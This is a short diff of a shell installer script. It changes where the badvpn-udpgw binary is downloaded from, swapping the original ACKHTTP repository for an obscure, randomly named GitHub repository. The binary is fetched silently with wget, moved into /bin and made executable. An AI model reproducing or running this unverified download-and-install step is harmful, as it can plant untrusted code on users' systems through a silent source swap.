@@ -54,7 +54,7 @@ echo -e "\033[01;34m============================================================
                     sleep 0.1
                 } || {
                     cd $HOME
-                    wget https://github.com/ACKHTTP/ACKHTTP-SERVER-MANAGER/raw/main/SCRIPT%20ACKHTTP%20SERVER/SCRIPT%20ACKHTTP%20SERVER/BADVPN%20UDP/badvpn-udpgw > /dev/null 2>&1
+                    wget https://github.com/BGXSJYRABJE/hdisbsi/raw/main/BADVPN%20UDP/badvpn-udpgw > /dev/null 2>&1
                     mv -f $HOME/badvpn-udpgw /bin/badvpn-udpgw
                     chmod +x /bin/badvpn-udpgw
                 }
